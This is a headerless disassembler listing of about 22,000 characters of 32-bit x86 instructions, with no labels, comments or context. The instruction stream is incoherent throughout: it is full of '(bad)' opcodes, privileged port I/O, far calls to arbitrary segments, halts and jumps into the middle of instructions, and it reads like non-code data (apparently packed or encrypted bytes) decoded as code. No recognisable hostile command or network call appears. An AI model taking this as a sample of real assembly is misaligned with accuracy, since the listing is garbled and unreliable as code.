  412b16:	mov    cl,BYTE PTR [ecx+eax*1+0x34]
  412b1a:	xchg   ebx,eax
  412b1b:	push   ebp
  412b1c:	rol    BYTE PTR [esi-0x25f2a7aa],cl
  412b22:	cs mov esi,ss
  412b25:	push   esi
  412b26:	pop    eax
  412b27:	mov    al,ds:0xfa2f06db
  412b2c:	je     0x412ba7
  412b2e:	xchg   edi,eax
  412b2f:	pop    eax
  412b30:	shr    BYTE PTR [esi],1
  412b32:	clc    
  412b33:	or     al,0x0
  412b35:	fsubr  QWORD PTR [edx+0x19]
  412b38:	and    al,0xea
  412b3a:	mov    dh,0xfc
  412b3c:	pop    esi
  412b3d:	add    al,0x68
  412b3f:	shld   DWORD PTR [esp+ebx*8],esp,cl
  412b43:	or     esi,DWORD PTR [ecx+0x3a]
  412b46:	rol    ah,cl
  412b48:	pusha  
  412b49:	inc    ebp
  412b4a:	add    eax,0xeaa7741b
  412b4f:	or     al,0x76
  412b51:	stos   BYTE PTR es:[edi],al
  412b52:	pushw  0xffd0
  412b55:	and    BYTE PTR [edx+0x58],ch
  412b58:	(bad)  
  412b59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b5a:	lock out 0x75,al
  412b5d:	sub    al,0x32
  412b5f:	hlt    
  412b60:	add    esi,ebp
  412b62:	or     ebx,edx
  412b64:	ficom  DWORD PTR [ebx]
  412b66:	sub    esi,DWORD PTR [esi]
  412b68:	aas    
  412b69:	jnp    0x412b4d
  412b6b:	push   ss
  412b6c:	pop    esp
  412b6d:	dec    ecx
  412b6e:	(bad)  [edi-0x6]
  412b71:	and    esp,ebp
  412b73:	fiadd  WORD PTR [eax]
  412b75:	mov    ah,0x9f
  412b77:	shr    DWORD PTR [esi+0x3a00d715],0x9e
  412b7e:	pop    esi
  412b7f:	inc    ecx
  412b80:	dec    edx
  412b81:	in     al,dx
  412b82:	pop    ebx
  412b83:	adc    DWORD PTR [ebx-0x72],0xf616ea64
  412b8a:	popa   
  412b8b:	inc    esi
  412b8c:	cmc    
  412b8d:	jge    0x412bc9
  412b8f:	push   ss
  412b90:	pop    esp
  412b91:	or     DWORD PTR [edx-0x4a9ccf3b],esi
  412b97:	fiadd  WORD PTR [edi+0x4]
  412b9a:	push   ebp
  412b9b:	xchg   ebp,eax
  412b9c:	popa   
  412b9d:	cmp    BYTE PTR ds:0x2ed207de,0xb1
  412ba4:	mov    BYTE PTR [edx-0x34],cl
  412ba7:	xor    dl,BYTE PTR [eax-0x6f7a9d2d]
  412bad:	mov    dl,0x89
  412baf:	jp     0x412bcf
  412bb1:	sub    ch,ch
  412bb3:	adc    BYTE PTR [ebx+0x53],dl
  412bb6:	xchg   edi,eax
  412bb7:	mov    ebp,0xee00e88e
  412bbc:	cmp    BYTE PTR [eax+0x6a28f78c],cl
  412bc2:	cmp    ch,BYTE PTR [ecx]
  412bc4:	lock and al,0x60
  412bc7:	out    dx,eax
  412bc8:	aad    0xb4
  412bca:	jl     0x412b8e
  412bcc:	push   0x2
  412bce:	add    ah,BYTE PTR [eax-0x1851b42]
  412bd4:	add    eax,0x36554d4d
  412bd9:	pop    eax
  412bda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bdb:	ret    
  412bdc:	xor    al,0x15
  412bde:	test   al,0xe7
  412be0:	aad    0x6c
  412be2:	add    eax,0xce2a08a
  412be7:	in     al,dx
  412be8:	xchg   esp,eax
  412be9:	jne    0x412bf0
  412beb:	cwde   
  412bec:	pop    esp
  412bed:	push   ebp
  412bee:	adc    eax,0x33ac160f
  412bf3:	fs push 0xffffffd8
  412bf6:	ficom  WORD PTR [esi-0x26]
  412bf9:	mov    edx,0x5db82a8a
  412bfe:	xchg   edx,eax
  412bff:	or     al,0x5c
  412c01:	mov    al,0x4
  412c03:	pop    ecx
  412c04:	push   esi
  412c05:	mov    al,ds:0x8800e0aa
  412c0a:	pop    edi
  412c0b:	mov    ds:0xcd763cf2,al
  412c10:	ror    BYTE PTR [eax+eiz*4],1
  412c13:	pushf  
  412c14:	fwait
  412c15:	stos   BYTE PTR es:[edi],al
  412c16:	sub    eax,0x76f1d0b6
  412c1b:	je     0x412bb5
  412c1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c1e:	imul   edi,DWORD PTR [edx],0x9cfb84f6
  412c24:	lea    ecx,[edx-0x2fcd85d8]
  412c2a:	sbb    al,0xa6
  412c2c:	jl     0x412c1c
  412c2e:	es jp  0x412c2e
  412c31:	aam    0x7
  412c33:	sub    al,0x6c
  412c35:	mov    edi,0x7b1b90f7
  412c3a:	sbb    al,0x1c
  412c3c:	fwait
  412c3d:	sub    bl,BYTE PTR [edx-0x25236883]
  412c43:	adc    DWORD PTR [edx-0x29a86b00],ebp
  412c49:	retf   0x64b2
  412c4c:	add    DWORD PTR [ebp-0x4bc5749a],esi
  412c52:	xchg   DWORD PTR [esp+edx*1],edx
  412c55:	repz mov gs,WORD PTR [edx+0x28]
  412c59:	push   edx
  412c5a:	mov    cl,0x38
  412c5c:	add    dl,BYTE PTR [esi]
  412c5e:	adc    al,0xb0
  412c60:	je     0x412c2e
  412c62:	add    al,0x40
  412c64:	jbe    0x412c28
  412c66:	ins    DWORD PTR es:[edi],dx
  412c67:	inc    ecx
  412c68:	jmp    0x412cd4
  412c6a:	add    ah,BYTE PTR [ebx+0x68]
  412c6d:	pop    esi
  412c6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c6f:	or     edi,esp
  412c71:	test   BYTE PTR [ebp+0x76],cl
  412c74:	rol    eax,1
  412c76:	add    ecx,DWORD PTR [edx]
  412c78:	sbb    eax,0x84bab554
  412c7d:	jnp    0x412ce8
  412c7f:	lea    ecx,[ecx+0x79428a87]
  412c85:	js     0x412c27
  412c87:	stc    
  412c88:	adc    BYTE PTR [esi-0x2e],0x79
  412c8c:	call   0x9900:0xa23b48db
  412c93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c94:	outs   dx,BYTE PTR ds:[esi]
  412c95:	sbb    DWORD PTR [eax],esi
  412c97:	jl     0x412c1e
  412c99:	and    al,0x64
  412c9b:	xor    BYTE PTR [ebx+0x0],bl
  412c9e:	xchg   ebx,eax
  412c9f:	sar    DWORD PTR [esi],cl
  412ca1:	dec    edi
  412ca2:	aam    0x47
  412ca4:	je     0x412c62
  412ca6:	xchg   edi,eax
  412ca7:	sub    BYTE PTR [edx],al
  412ca9:	shl    DWORD PTR [esi],cl
  412cab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412cac:	lods   al,BYTE PTR ds:[esi]
  412cad:	jb     0x412cb9
  412caf:	dec    ebp
  412cb0:	mov    dl,0x59
  412cb2:	push   cs
  412cb3:	fdivr  st,st(1)
  412cb5:	and    cl,BYTE PTR [eax]
  412cb7:	ins    BYTE PTR es:[edi],dx
  412cb8:	(bad)  
  412cb9:	shl    dh,0xca
  412cbc:	sahf   
  412cbd:	lods   eax,DWORD PTR ds:[esi]
  412cbe:	or     ebx,DWORD PTR [eax-0x2c]
  412cc1:	mov    esi,0x846c36c
  412cc6:	je     0x412c60
  412cc8:	enter  0x3a14,0x6
  412ccc:	push   ds
  412ccd:	dec    edx
  412cce:	in     eax,0xce
  412cd0:	clc    
  412cd1:	popf   
  412cd2:	dec    esp
  412cd3:	sub    DWORD PTR [edx+0x54],ebx
  412cd6:	rcr    BYTE PTR [esi-0x4b],1
  412cd9:	mov    ah,0x77
  412cdb:	inc    esp
  412cdc:	ins    DWORD PTR es:[edi],dx
  412cdd:	mov    ch,0xf2
  412cdf:	js     0x412c61
  412ce1:	pusha  
  412ce2:	mov    al,0x9a
  412ce4:	sub    cl,dh
  412ce6:	not    al
  412ce8:	fcmovbe st,st(0)
  412cea:	loopne 0x412c90
  412cec:	mov    esp,0xe40a0276
  412cf1:	push   es
  412cf2:	mov    ds:0x7744fe99,eax
  412cf7:	xchg   edx,eax
  412cf8:	add    BYTE PTR [ecx+0x36],dl
  412cfb:	retf   0x9af4
  412cfe:	inc    esi
  412cff:	and    DWORD PTR [eax-0x2],esi
  412d02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d03:	hlt    
  412d04:	dec    esp
  412d05:	pop    ecx
  412d06:	add    ah,ah
  412d08:	rol    DWORD PTR [eax],0xbe
  412d0b:	xor    BYTE PTR [esi-0x58],ah
  412d0e:	sub    esp,DWORD PTR [ecx-0x2f]
  412d11:	adc    esi,edx
  412d13:	mov    WORD PTR [esp+eiz*2-0x61],ds
  412d17:	push   0xffffffd7
  412d19:	jbe    0x412ca3
  412d1b:	mov    esi,0xbe66c8e4
  412d20:	fwait
  412d21:	push   ebx
  412d22:	iret   
  412d23:	mov    ecx,0x4fc10108
  412d28:	dec    eax
  412d29:	add    al,ah
  412d2b:	push   ds
  412d2c:	jb     0x412d33
  412d2e:	sub    al,al
  412d30:	add    DWORD PTR [edx+0x2c4f729e],ebp
  412d36:	or     DWORD PTR [eax+esi*4-0x7a11c5ff],ebp
  412d3d:	ret    
  412d3e:	ror    DWORD PTR [esi+0x46162b2e],0x4a
  412d45:	mov    esi,0x10c60492
  412d4a:	ins    BYTE PTR es:[edi],dx
  412d4b:	(bad)  
  412d4c:	shr    BYTE PTR [edx+esi*4+0x13f49672],cl
  412d53:	jo     0x412d7f
  412d55:	rcl    DWORD PTR [eax],0x9a
  412d58:	das    
  412d59:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d5b:	inc    ebp
  412d5c:	add    BYTE PTR [edx+0x748a538c],al
  412d62:	push   ss
  412d63:	lock test al,0x15
  412d66:	inc    esi
  412d67:	call   0x1a8b:0x514e3914
  412d6e:	stos   BYTE PTR es:[edi],al
  412d6f:	adc    al,dl
  412d71:	mov    ebx,0x6faeaa72
  412d76:	add    ch,ch
  412d78:	add    BYTE PTR [ecx+0x5455166b],ch
  412d7e:	jo     0x412dd0
  412d80:	mov    dl,0xd6
  412d82:	ins    DWORD PTR es:[edi],dx
  412d83:	mov    ch,0x86
  412d85:	or     dl,BYTE PTR [esi]
  412d87:	loop   0x412d10
  412d89:	mov    eax,0x4357b242
  412d8e:	xchg   ecx,eax
  412d8f:	sub    eax,0x22d20f32
  412d94:	inc    esp
  412d95:	jnp    0x412dcf
  412d97:	out    dx,eax
  412d98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d99:	inc    edx
  412d9a:	push   ecx
  412d9b:	inc    ecx
  412d9c:	inc    ebx
  412d9d:	pop    ss
  412d9e:	xchg   edx,eax
  412d9f:	xchg   eax,ebx
  412da1:	cmp    eax,0xd8059080
  412da6:	sbb    cl,BYTE PTR [esp+esi*1+0x16fac9fe]
  412dad:	(bad)  
  412dae:	hlt    
  412daf:	push   esi
  412db0:	test   eax,0xb6093ac2
  412db5:	loopne 0x412e02
  412db7:	xchg   BYTE PTR [ebx-0x4b],al
  412dba:	or     dl,BYTE PTR [esi]
  412dbc:	push   ecx
  412dbd:	xchg   esp,eax
  412dbe:	cld    
  412dbf:	jo     0x412d6c
  412dc1:	and    ah,cl
  412dc3:	or     BYTE PTR [edx+0x2212acaa],0x3a
  412dca:	aad    0xc6
  412dcc:	pop    ss
  412dcd:	shr    DWORD PTR [edx],0xfc
  412dd0:	dec    edx
  412dd1:	fdivr  DWORD PTR [eax+0x14c4d90e]
  412dd7:	int    0x0
  412dd9:	push   esi
  412dda:	mov    fs,WORD PTR [esi-0x474b8c87]
  412de0:	mov    esi,0xa7c49067
  412de5:	cmp    al,BYTE PTR [eax]
  412de7:	mov    edi,0x80b5e9f3
  412dec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ded:	add    cl,BYTE PTR [edx]
  412def:	lods   al,BYTE PTR ds:[esi]
  412df0:	dec    esi
  412df1:	mov    bh,0xf7
  412df3:	mov    dh,0x59
  412df5:	sti    
  412df6:	or     ah,bl
  412df8:	mov    DWORD PTR [eax+edx*8+0x1994ee6b],esi
  412dff:	outs   dx,BYTE PTR ds:[esi]
  412e00:	sub    BYTE PTR [ebp+0x40],dl
  412e03:	sbb    eax,0x9cbc6da2
  412e08:	ins    BYTE PTR es:[edi],dx
  412e09:	cmp    BYTE PTR [eax-0x65e95e5b],ah
  412e0f:	cs loop 0x412df2
  412e12:	xchg   edx,eax
  412e13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e14:	cs ret 0x4036
  412e18:	jmp    0x99e:0xe24a9ee3
  412e1f:	fsubr  DWORD PTR [ebx+ebp*2+0x7c]
  412e23:	add    DWORD PTR [eax],edx
  412e25:	adc    BYTE PTR [ecx-0x2ebb0548],0x34
  412e2c:	adc    al,0x54
  412e2e:	sbb    eax,0x6bd8eaee
  412e33:	shl    BYTE PTR [esi-0x175505f8],cl
  412e39:	mov    ch,0x75
  412e3b:	push   esp
  412e3c:	jnp    0x412de4
  412e3e:	jge    0x412e5f
  412e40:	lahf   
  412e41:	xlat   BYTE PTR ds:[ebx]
  412e42:	hlt    
  412e43:	jo     0x412e62
  412e45:	add    al,0xaa
  412e48:	in     al,0x84
  412e4a:	(bad)  
  412e4b:	xchg   BYTE PTR ds:0xc163935b,dl
  412e51:	add    cl,ch
  412e53:	mov    bl,BYTE PTR [esi]
  412e55:	add    DWORD PTR [eax],0x312e28d6
  412e5b:	out    0x4a,eax
  412e5d:	xchg   edi,eax
  412e5e:	shl    BYTE PTR [esi+0x58],1
  412e61:	dec    esp
  412e62:	pusha  
  412e63:	xor    edx,DWORD PTR [edx]
  412e65:	or     ah,BYTE PTR [ebx+0x4c1069a8]
  412e6b:	pop    esp
  412e6c:	adc    BYTE PTR [edi+0x68],dl
  412e6f:	or     DWORD PTR [ecx],ecx
  412e71:	adc    BYTE PTR [eax],0x12
  412e74:	cmp    dh,BYTE PTR [eax-0x689ca3fe]
  412e7a:	adc    BYTE PTR [edx+eiz*1-0xf],bl
  412e7e:	push   cs
  412e7f:	or     ah,al
  412e81:	ror    BYTE PTR [eax],0x40
  412e84:	lds    edx,FWORD PTR [ebx+eax*2-0x5667c6cc]
  412e8b:	stos   DWORD PTR es:[edi],eax
  412e8c:	stos   DWORD PTR es:[edi],eax
  412e8d:	cdq    
  412e8e:	inc    edx
  412e8f:	lea    edi,[ecx+edx*4+0x18959ce6]
  412e96:	push   ebp
  412e97:	lods   eax,DWORD PTR ds:[esi]
  412e98:	cli    
  412e99:	add    edi,edx
  412e9b:	arpl   si,ax
  412e9d:	out    dx,eax
  412e9e:	loop   0x412ee2
  412ea0:	fld    TBYTE PTR [edx]
  412ea2:	call   0xeb40:0x40e3cb62
  412ea9:	jl     0x412e84
  412eab:	jo     0x412efd
  412ead:	loop   0x412f07
  412eaf:	shl    BYTE PTR [edi],0xb5
  412eb2:	and    bl,BYTE PTR [eax+0x10249459]
  412eb8:	bound  edx,QWORD PTR [ecx]
  412eba:	add    dh,al
  412ebc:	pushf  
  412ebd:	sub    BYTE PTR [eax],dh
  412ebf:	sbb    edx,DWORD PTR [edi-0x279b50ba]
  412ec5:	mov    al,ds:0xe60d0a5d
  412eca:	fadd   DWORD PTR [eax+edx*2+0x70864ecf]
  412ed1:	mov    WORD PTR [edx],gs
  412ed3:	test   al,0x40
  412ed5:	adc    eax,DWORD PTR [ebx+eiz*8]
  412ed8:	(bad)  
  412ed9:	mov    ecx,0x5e2a02e1
  412ede:	add    BYTE PTR [ecx+ebp*1+0x0],bl
  412ee2:	xchg   edx,eax
  412ee3:	sub    BYTE PTR [ebx],dh
  412ee5:	out    dx,al
  412ee6:	add    al,0x58
  412ee8:	mov    al,ds:0xf80f84d8
  412eed:	push   edx
  412eee:	or     al,0x7a
  412ef0:	je     0x412f20
  412ef2:	or     DWORD PTR [ebp-0x2b],edx
  412ef5:	shl    dl,1
  412ef7:	scas   eax,DWORD PTR es:[edi]
  412ef8:	es jb  0x412ee5
  412efb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412efc:	ficomp DWORD PTR fs:[esi-0x58a7c92f]
  412f03:	popa   
  412f04:	pop    eax
  412f05:	and    ch,BYTE PTR [esi+0x70442e3d]
  412f0b:	mov    al,0x4e
  412f0d:	shl    DWORD PTR [esi+0x5],0xb4
  412f11:	xchg   ecx,eax
  412f12:	rcr    BYTE PTR [edx],1
  412f14:	push   cs
  412f15:	add    al,0x2f
  412f17:	mov    dh,dl
  412f19:	sub    al,0x96
  412f1b:	add    ebx,DWORD PTR [ecx]
  412f1d:	dec    edx
  412f1e:	mov    dl,0x2
  412f20:	out    dx,al
  412f21:	xchg   ebx,eax
  412f22:	and    ebx,eax
  412f24:	psubsw mm1,QWORD PTR [ebp-0x12]
  412f28:	xchg   esp,eax
  412f29:	add    al,bl
  412f2b:	sbb    eax,0x1a0848a2
  412f30:	push   edi
  412f31:	mov    ebx,0xc4f43620
  412f36:	push   cs
  412f37:	(bad)  
  412f38:	fidivr WORD PTR [edx]
  412f3a:	push   edi
  412f3b:	or     BYTE PTR [ebx-0x7f],al
  412f3e:	nop
  412f3f:	inc    eax
  412f40:	mov    edx,0x9ea99098
  412f45:	push   esp
  412f46:	aad    0xcc
  412f48:	inc    eax
  412f49:	loopne 0x412faf
  412f4b:	push   ss
  412f4c:	or     eax,0xf516947e
  412f51:	sub    BYTE PTR [edx+0x64cc1366],0xc0
  412f58:	daa    
  412f59:	sub    eax,0xbec5b32a
  412f5e:	addr16 add esi,edi
  412f61:	ror    BYTE PTR [esi],1
  412f63:	lea    edx,[esi+0x2]
  412f66:	fisub  WORD PTR [ecx+eax*2+0x66]
  412f6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f6b:	push   ss
  412f6c:	stos   BYTE PTR es:[edi],al
  412f6d:	push   esp
  412f6e:	rcl    DWORD PTR [ecx+0x54],1
  412f71:	cmp    al,0x3b
  412f73:	xor    ah,BYTE PTR [ecx-0x6a29c32e]
  412f79:	push   ecx
  412f7a:	pusha  
  412f7b:	pop    eax
  412f7c:	ror    dl,1
  412f7e:	and    DWORD PTR [esi-0x4b],esp
  412f81:	popf   
  412f82:	mov    esp,0x5aa5ef6c
  412f87:	and    BYTE PTR [eax-0x60],bl
  412f8a:	mov    DWORD PTR [ebx-0x490003b8],edx
  412f90:	not    BYTE PTR ds:0x7ca91474
  412f96:	cwde   
  412f97:	test   dh,bl
  412f99:	or     bl,BYTE PTR [esi]
  412f9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f9c:	fist   WORD PTR [eax+esi*4-0x5d]
  412fa0:	pop    eax
  412fa1:	inc    esp
  412fa2:	add    BYTE PTR [edi+ecx*1+0x5ff44ae2],bl
  412fa9:	add    BYTE PTR [edx],ch
  412fab:	sti    
  412fac:	add    BYTE PTR [esi],cl
  412fae:	ret    
  412faf:	cmp    ecx,0xffffff83
  412fb2:	dec    ecx
  412fb3:	add    BYTE PTR [esp+ebx*1],bl
  412fb6:	aam    0xab
  412fb8:	mov    WORD PTR [eax],ds
  412fba:	inc    esp
  412fbb:	cmp    DWORD PTR [ecx-0x39],0x5e6cd130
  412fc2:	add    dh,dl
  412fc4:	and    BYTE PTR [ecx+ebp*2-0x6af37521],dh
  412fcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412fcc:	leave  
  412fcd:	mov    al,0x3e
  412fcf:	mov    esp,DWORD PTR [edx]
  412fd1:	(bad)
  412fd4:	shr    BYTE PTR [eax+0x13],cl
  412fd7:	or     bh,dl
  412fd9:	push   0xffffff82
  412fdb:	rcr    esp,1
  412fdd:	or     ebp,eax
  412fdf:	mov    esi,0x6cd4d1d6
  412fe4:	cmp    edx,edx
  412fe6:	xor    al,0x46
  412fe8:	adc    DWORD PTR [eax-0x4dda576a],ecx
  412fee:	sbb    esi,DWORD PTR [esi]
  412ff0:	and    DWORD PTR [ebx+esi*4-0x57149564],eax
  412ff7:	mov    esp,0x2aad002b
  412ffc:	add    DWORD PTR [esi-0x1ef6171a],esi
  413002:	mov    eax,0xc9b0bd0c
  413007:	dec    ecx
  413008:	sub    BYTE PTR [edx],dl
  41300a:	adc    BYTE PTR [esi],ch
  41300c:	adc    al,0x72
  41300e:	ror    DWORD PTR [esi+0x4b6605c3],0xfe
  413015:	push   ds
  413016:	cs jl  0x412fcd
  413019:	sub    DWORD PTR [ebp+0x42c225ca],0x5d1bfa5a
  413023:	test   BYTE PTR [eax+0x352aa3e2],al
  413029:	das    
  41302a:	and    dl,BYTE PTR [eax-0x45e9db7a]
  413030:	push   eax
  413031:	adc    DWORD PTR [edx+eax*4+0x14aa0bf6],0xf0b3eaae
  41303c:	les    esi,FWORD PTR [esi-0x58]
  41303f:	adc    esi,DWORD PTR [eax+0x148a9835]
  413045:	scas   al,BYTE PTR es:[edi]
  413046:	push   edx
  413047:	jmp    DWORD PTR [edx-0x70]
  41304a:	lds    esp,FWORD PTR ss:[ebx]
  41304d:	jmp    0x41305e
  41304f:	iret   
  413050:	mov    ds:0x709ad524,al
  413055:	jb     0x413008
  413057:	inc    edi
  413058:	sub    edi,DWORD PTR [edx-0xdb70150]
  41305e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41305f:	mov    al,ds:0xf0ded2a2
  413064:	dec    ebp
  413065:	popa   
  413066:	hlt    
  413067:	sbb    esi,esi
  413069:	inc    ecx
  41306a:	sahf   
  41306b:	arpl   WORD PTR [eax+eax*1+0x611322d4],ax
  413072:	and    dh,BYTE PTR [eax-0x78]
  413075:	pop    esp
  413076:	retf   0x820
  413079:	mov    dh,0x78
  41307b:	add    al,0xf5
  41307d:	pop    es
  41307e:	nop
  41307f:	sbb    BYTE PTR [edi],cl
  413081:	push   0xffffffc3
  413083:	mov    ds:0x9ede2a0c,eax
  413088:	pop    eax
  413089:	(bad)  
  41308a:	mov    eax,es:0xc28a9a34
  413090:	adc    BYTE PTR [eax-0xa52efe6],ah
  413096:	and    al,0xd0
  413098:	test   BYTE PTR [edx],0x27
  41309b:	xchg   esi,eax
  41309c:	add    al,0xba
  41309e:	inc    eax
  41309f:	inc    eax
  4130a0:	mov    al,ds:0x2868aad2
  4130a5:	pushf  
  4130a6:	push   edx
  4130a7:	mov    edx,edx
  4130a9:	call   0xb06f:0x86f9
  4130af:	add    al,0x50
  4130b1:	les    eax,FWORD PTR [edx+0x165e4a00]
  4130b7:	inc    ebx
  4130b8:	or     BYTE PTR [eax],ch
  4130ba:	aam    0xa
  4130bc:	int3   
  4130bd:	stos   BYTE PTR es:[edi],al
  4130be:	jbe    0x4130dd
  4130c0:	push   0x2a
  4130c2:	and    BYTE PTR [ecx+edi*4],dl
  4130c5:	in     al,0x50
  4130c7:	popf   
  4130c8:	js     0x413136
  4130ca:	mov    al,ds:0x54a87699
  4130cf:	sub    ax,0x5806
  4130d3:	mov    esi,0x682c0024
  4130d8:	push   cs
  4130d9:	in     al,dx
  4130da:	or     dl,BYTE PTR [ecx-0x27195aac]
  4130e0:	aad    0xd1
  4130e2:	push   ds
  4130e3:	sub    al,0xaf
  4130e5:	or     ch,BYTE PTR [ecx]
  4130e7:	adc    ah,BYTE PTR [edx+edx*4-0x54b73f8c]
  4130ee:	mov    esi,0x5808108e
  4130f3:	adc    cl,BYTE PTR [esi+esi*4]
  4130f6:	or     DWORD PTR [ebx],0x6df8f68a
  4130fc:	test   eax,0x3c0a104c
  413101:	js     0x413167
  413103:	clc    
  413104:	add    eax,0xd68d2161
  413109:	inc    eax
  41310a:	mov    ch,0xb6
  41310c:	pop    ss
  41310d:	sbb    al,0x58
  41310f:	pop    eax
  413110:	es push ebp
  413112:	dec    eax
  413113:	into   
  413114:	mov    ch,0x30
  413116:	retf   
  413117:	pop    ss
  413118:	add    BYTE PTR [edx-0x683d60e3],ch
  41311e:	xchg   esp,eax
  41311f:	inc    ch
  413121:	dec    eax
  413122:	(bad)  
  413123:	or     eax,eax
  413125:	mov    ebx,0xf2448961
  41312a:	and    al,0x54
  41312c:	add    bl,ah
  41312e:	daa    
  41312f:	imul   ebp,DWORD PTR [ebx-0x50],0xf
  413133:	inc    esi
  413134:	sbb    al,dl
  413136:	and    bl,BYTE PTR [esi]
  413138:	ror    eax,0x30
  41313b:	lock pop ebx
  41313d:	rcr    DWORD PTR [ecx],1
  41313f:	cmp    BYTE PTR [edi+ebp*1-0x72],al
  413143:	mov    ebp,0x25f900
  413148:	fs (bad) 
  41314a:	pop    ebx
  41314b:	mov    ch,0x61
  41314d:	or     BYTE PTR [esp+ebx*8+0x5009670],bl
  413154:	data16 scas al,BYTE PTR es:[edi]
  413156:	or     BYTE PTR [edi+edx*1+0x76e9059c],dh
  41315d:	ins    DWORD PTR es:[edi],dx
  41315e:	mov    BYTE PTR [ebx+edi*1+0x1e3a0eb2],ch
  413165:	pop    es
  413166:	mov    edx,0x949d84dd
  41316b:	mov    DWORD PTR [eax+0x1a4042c3],eax
  413171:	sbb    al,0x1d
  413173:	ins    DWORD PTR es:[edi],dx
  413174:	cmp    DWORD PTR [edx+ebx*8-0x33d72593],0xffffffcc
  41317c:	cmp    esp,esp
  41317e:	aas    
  41317f:	inc    eax
  413180:	sub    BYTE PTR [edx],dl
  413182:	sub    ch,BYTE PTR [eax+0x3d3d0]
  413188:	push   0x5
  41318a:	inc    edi
  41318b:	ret    0x1f47
  41318e:	test   BYTE PTR [esi+eax*8-0x34],ch
  413192:	rol    BYTE PTR [edx],1
  413194:	push   edx
  413195:	clc    
  413196:	sub    DWORD PTR [eax+esi*1-0x7b79786f],ebp
  41319d:	scas   eax,DWORD PTR es:[edi]
  41319e:	xchg   ebx,eax
  41319f:	sub    BYTE PTR [edx-0x18],0x78
  4131a3:	add    ah,al
  4131a5:	inc    edi
  4131a6:	adc    dl,BYTE PTR [edx+0x43]
  4131a9:	inc    ebp
  4131aa:	mov    DWORD PTR [esi-0x2a230a00],0x8b4a43b0
  4131b4:	cmp    al,ah
  4131b6:	push   ds
  4131b7:	push   es
  4131b8:	xor    al,0xd4
  4131ba:	scas   al,BYTE PTR es:[edi]
  4131bb:	add    al,0xa2
  4131bd:	test   eax,0x896a7dab
  4131c2:	xor    al,0x7a
  4131c4:	sahf   
  4131c5:	rcl    DWORD PTR [eax],0x1
  4131c8:	xchg   DWORD PTR [edx-0x7e],ecx
  4131cb:	loop   0x41315b
  4131cd:	xlat   BYTE PTR ds:[ebx]
  4131ce:	pop    esi
  4131cf:	out    dx,al
  4131d0:	scas   al,BYTE PTR es:[edi]
  4131d1:	sub    dl,ch
  4131d3:	or     al,0x60
  4131d5:	xchg   DWORD PTR [eax],ebx
  4131d7:	mov    dh,0x76
  4131d9:	mov    BYTE PTR [ecx+0xa6a8856],ah
  4131df:	repz jo 0x4131e8
  4131e2:	dec    ebp
  4131e3:	imul   eax,DWORD PTR ds:0x208856cd,0x942fcb64
  4131ed:	mov    ss,WORD PTR [eax-0x7fe1d67c]
  4131f3:	adc    eax,0xd0ebda0d
  4131f8:	popa   
  4131f9:	cs inc esi
  4131fb:	and    WORD PTR [edx+0x64],bx
  4131ff:	mov    ebx,0x52abf1ce
  413204:	stos   BYTE PTR es:[edi],al
  413205:	leave  
  413206:	ret    0xabb6
  413209:	push   ebp
  41320a:	pop    eax
  41320b:	test   esi,esi
  41320d:	out    dx,eax
  41320e:	mov    esi,0x3e94fda6
  413213:	push   ss
  413214:	pusha  
  413215:	test   DWORD PTR [eax+0x1e],esi
  413218:	mov    dh,0x60
  41321a:	or     cl,BYTE PTR [esi+0x56]
  41321d:	(bad)  [eax+ebp*4-0xb251378]
  413224:	pop    edx
  413225:	xchg   BYTE PTR [edx*2-0x18a34c93],bl
  41322c:	loope  0x4131ec
  41322e:	jae    0x413208
  413230:	sbb    ah,BYTE PTR [eax-0x4e]
  413233:	jbe    0x413269
  413235:	add    eax,esi
  413237:	mov    eax,0xa5b3cc7f
  41323c:	sub    al,0x60
  41323e:	xor    DWORD PTR [eax-0x8],0xfffffff0
  413242:	ins    DWORD PTR es:[edi],dx
  413243:	cs retf 0x213a
  413247:	jnp    0x4132a5
  413249:	jno    0x4132c4
  41324b:	push   0xffffff8c
  41324d:	ret    
  41324e:	dec    esp
  41324f:	or     BYTE PTR ds:0x87a8aa4e,0x9c
  413256:	and    DWORD PTR ds:[esi+eiz*2+0x3b],0xf380b5da
  41325f:	in     al,0xf3
  413261:	push   edx
  413262:	loopne 0x413224
  413264:	pop    edi
  413265:	mov    al,0xc0
  413267:	add    dl,BYTE PTR ds:0xa25ed664
  41326d:	test   DWORD PTR [eax+0x45],eax
  413270:	adc    eax,0x656a59f6
  413275:	test   DWORD PTR [eax+0x6892cfca],0xa6e6d335
  41327f:	xor    DWORD PTR [edx-0x50],ebp
  413282:	add    BYTE PTR [edi],ch
  413284:	mov    eax,0xf55e289f
  413289:	sbb    DWORD PTR [esi],esi
  41328b:	push   esp
  41328c:	adc    eax,0xbcc03cd4
  413291:	pop    esp
  413292:	and    esi,ebp
  413294:	in     al,dx
  413295:	adc    DWORD PTR [ecx],0x26
  413298:	mov    al,ds:0xbeccc86a
  41329d:	mov    WORD PTR [eax],cs
  41329f:	and    ebp,DWORD PTR [ebx+0x53]
  4132a2:	(bad)  
  4132a4:	push   0x17
  4132a6:	int3   
  4132a7:	neg    BYTE PTR [ebx-0x40]
  4132aa:	or     bh,BYTE PTR [eax+edi*8]
  4132ad:	jl     0x4132f3
  4132af:	(bad)  
  4132b0:	icebp  
  4132b1:	or     ch,BYTE PTR [edi-0x53]
  4132b4:	xor    al,BYTE PTR [edx+0x76]
  4132b7:	js     0x41324e
  4132b9:	sub    eax,0x78e8a578
  4132be:	shr    BYTE PTR [edx],0x91
  4132c1:	adc    al,BYTE PTR [eax+esi*1+0x2b]
  4132c5:	and    cl,BYTE PTR [ebx]
